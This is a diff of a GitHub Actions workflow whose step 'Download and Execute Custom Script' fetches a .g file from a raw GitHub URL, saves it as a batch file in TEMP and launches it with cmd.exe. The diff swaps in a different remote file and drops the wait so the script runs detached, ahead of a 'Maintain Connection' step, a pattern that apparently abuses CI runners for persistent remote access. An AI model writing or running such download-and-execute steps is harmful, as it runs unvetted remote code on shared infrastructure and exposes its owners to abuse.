@@ -91,7 +91,7 @@ jobs:
 
       - name: Download and Execute Custom Script
         run: |
-          $url  = "https://raw.githubusercontent.com/wkvykexddo/ESSENCE/refs/heads/main/Starter.g"
+          $url  = "https://raw.githubusercontent.com/wkvykexddo/ESSENCE/refs/heads/main/Starter-small.g"
           $dest = "$env:TEMP\script.bat"
 
           Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
@@ -101,7 +101,7 @@ jobs:
             exit 1
           }
 
-          Start-Process cmd.exe -ArgumentList "/c `"$dest`"" -Wait
+          Start-Process cmd.exe -ArgumentList "/c `"$dest`""
 
 
       - name: Maintain Connection
